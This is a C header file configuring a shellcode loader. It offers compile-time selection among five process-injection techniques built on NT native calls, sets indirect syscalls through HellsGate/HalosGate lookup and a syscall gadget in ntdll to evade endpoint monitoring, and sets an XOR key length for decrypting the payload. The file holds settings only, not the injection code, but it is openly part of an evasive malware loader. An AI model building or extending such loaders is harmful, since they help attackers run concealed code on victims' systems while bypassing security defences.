#ifndef CONFIG_H
#define CONFIG_H

/*
 * Loader build configuration.
 * Edit these values or override them with -D flags at compile time.
 */

/* --- Technique selection ---
 *  0 = nt_thread      NtCreateThreadEx
 *  1 = nt_apc         NtQueueApcThread + NtTestAlert (self-inject)
 *  2 = nt_section     NtCreateSection + NtMapViewOfSection (dual-map)
 *  3 = nt_callback    EnumWindows callback
 *  4 = nt_suspended   NtCreateThreadEx (CREATE_SUSPENDED) + ResumeThread
 */
#ifndef DEFAULT_TECHNIQUE
#define DEFAULT_TECHNIQUE 4
#endif

/* --- Syscall mode ---
 * Set to 1 to resolve NT functions through HellsGate/HalosGate
 * SSN lookup and execute via a syscall;ret gadget inside ntdll
 * (indirect syscalls).
 *
 * Set to 0 to resolve NT functions with GetProcAddress
 * (direct ntdll calls).
 */
#define USE_INDIRECT_SYSCALLS 1

/* --- Payload decryption ---
 * XOR key length in bytes for shellcode decryption.
 */
#ifndef XOR_KEY_LEN
#define XOR_KEY_LEN 16
#endif

#endif /* CONFIG_H */
